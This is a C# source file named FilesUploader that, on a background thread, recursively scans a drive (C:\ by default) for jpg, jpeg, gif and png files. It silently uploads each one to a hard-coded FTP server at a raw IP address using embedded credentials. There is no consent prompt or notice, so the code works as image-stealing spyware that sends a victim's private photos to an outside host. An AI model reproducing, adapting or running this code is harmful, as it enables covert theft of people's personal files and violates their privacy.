using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Threading;
using System.Net;

namespace FilesUploader
{
    class Uploader
    {
        private string Path1;
        private Thread T;
        private string[] formats = new string[] { "jpg","jpeg","gif","png"};

        public Uploader()
        {
            this.Path1=@"C:\";
            T = new Thread(scan);
        }


        public Uploader(string path)
        {
            this.Path1= path;
            T = new Thread(scan);
            //this.UploadFileToFTP(@"C:\p2_wa.jpg");
        }

        private void scan()
        {
            this.SearchFile(this.Path1);
        }
        public void Start()
        {
            if (!T.IsAlive) this.T.Start();
            else T.Resume();
        }

        public void Suspend()
        {
            T.Suspend();
        }
        public void Stop()
        {
            this.T.Abort();
        }

        private void SearchFile(string path)
        {
            string[] CorrentFolderFiles=null;
            try
            {
                CorrentFolderFiles = Directory.GetFiles(path); //get all files in this folder
            }
            catch
            {
                return;
            }
            for(int i=0;CorrentFolderFiles!= null&& i<CorrentFolderFiles.Length;i++) //check the format of each file 
            {
                if(this.IsInFormat(CorrentFolderFiles[i])) //if the file is image
                    this.Upload(CorrentFolderFiles[i]); //upload the file to the server
            }
            string[] SubFolders = Directory.GetDirectories(path); //get all the sub folders of this folder
            if (SubFolders == null) return; //if there is no sub folders

            for(int i=0;i<SubFolders.Length;i++) //do this method for each sub folder
            {
                SearchFile(SubFolders[i]);
            }
        }

        private bool IsInFormat(string filePath)
        {
            int index = filePath.LastIndexOf(".")+1; //find the index of the last point to know where the format name starting

            string format="";
            if(index!=-1) format = filePath.Substring(index); //if have a singed format for the file
            //if the file does not have '.' so he also dos not have singed format

            for (int i=0;index!=-1&&i<this.formats.Length;i++) //if index=-1 so there is no '.' and there is not a singed format
            {
                if (this.formats[i] == format) //file if the file has a known format
                    return true;
            }
            return false;
        }
        private void Upload(string filePath) //upload the file to the server
        {
            this.UploadFileToFTP(filePath);
        }

        private void UploadFileToFTP(string path)
        {
            FtpWebRequest request = (FtpWebRequest)FtpWebRequest.Create("ftp://31.170.160.84/Uploads/" + "/" + Path.GetFileName(path));
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential("a5487206", "anonimos");
            request.UsePassive = true;
            request.UseBinary = true;
            request.KeepAlive = false;
            FileStream stream = File.OpenRead(path);
            byte[] buffer = new byte[stream.Length];


            stream.Read(buffer, 0, buffer.Length);
            stream.Close();

            Stream reqStream = request.GetRequestStream();
            reqStream.Write(buffer, 0, buffer.Length);
            reqStream.Close();
        }
    }
}
